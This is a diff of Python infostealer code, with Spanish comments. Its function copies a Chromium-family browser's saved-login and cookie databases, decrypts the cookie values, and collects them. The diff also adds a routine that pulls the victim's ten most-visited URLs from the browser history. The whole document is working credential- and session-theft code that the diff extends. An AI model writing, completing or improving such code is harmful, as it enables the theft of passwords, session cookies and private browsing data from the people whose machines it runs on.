@@ -54,9 +54,9 @@ def get_data(navegador: list):
     #traigo archivo de logins
     file_passwords = os.path.join(work_dir, "Default", "Login Data")
     # copio el archivo de base de datos para no tener errores
-    shutil.copyfile(file_passwords, "dataLogin")
+    shutil.copyfile(file_passwords, f"dataLogin{navegador[1]}")
 
-    database  = sqlite3.connect("dataLogin")
+    database  = sqlite3.connect(f"dataLogin{navegador[1]}")
     consultas = database.cursor()
 
     contras = []
@@ -81,11 +81,11 @@ def get_data(navegador: list):
 
     try:
         #intento copiar el archivo
-        shutil.copyfile(file_cookies, "dataCookies")
+        shutil.copyfile(file_cookies, f"dataCookies{navegador[1]}")
     except:
         pass    
 
-    database = sqlite3.connect("dataCookies")
+    database = sqlite3.connect(f"dataCookies{navegador[1]}")
     consultas = database.cursor()
 
     cookies = []
@@ -95,7 +95,7 @@ def get_data(navegador: list):
     for row in consultas.fetchall():
         cookies.append({
            "url":row[0],
-           "nombre":row[1],
+           "clave":row[1],
            "creacion":convert_date(row[3]),
            "valor": row[2] if row[2] else decript_data(row[4], key)
         })
@@ -103,4 +103,30 @@ def get_data(navegador: list):
     consultas.close()
     database.close()
 
-    return {"cookies":cookies, "contras":contras}
+    #HISTORIAL
+    #traigo archivo de cookies
+    file_cookies = os.path.join(work_dir,  "Default", "History")
+
+    try:
+        #intento copiar el archivo
+        shutil.copyfile(file_cookies, f"dataHistory{navegador[1]}")
+    except:
+        pass
+
+    database = sqlite3.connect(f"dataHistory{navegador[1]}")
+    consultas = database.cursor()
+
+    historial = []
+
+    consultas.execute("SELECT url, SUM(visit_count) conteo FROM urls GROUP BY url ORDER BY SUM(visit_count) DESC LIMIT 10")
+
+    for row in consultas.fetchall():
+        historial.append({
+           "url":row[0],
+           "conteo":row[1]
+        })
+
+    consultas.close()
+    database.close()
+
+    return {"cookies":cookies, "contras":contras, "historial":historial}
